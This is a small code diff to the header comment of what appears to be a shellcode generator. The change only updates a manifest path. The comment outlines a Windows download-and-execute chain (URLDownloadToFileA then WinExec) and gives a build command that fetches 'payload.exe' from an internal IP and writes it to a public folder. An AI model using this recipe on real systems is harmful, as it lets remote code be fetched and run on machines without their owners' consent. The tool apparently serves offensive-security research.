@@ -2,7 +2,7 @@
 # IR workflow: LoadLibraryA(urlmon) -> URLDownloadToFileA -> WinExec -> exit
 #
 # Build:
-#   uv run emitrion emitrion/manifests/url_download.yaml \
+#   uv run emitrion emitrion/manifests/win-x86/url_download.yaml \
 #       --url "http://192.168.1.10/payload.exe" \
 #       --dst "C:\Users\Public\payload.exe" \
 #       --no-assemble --out emitter_out/
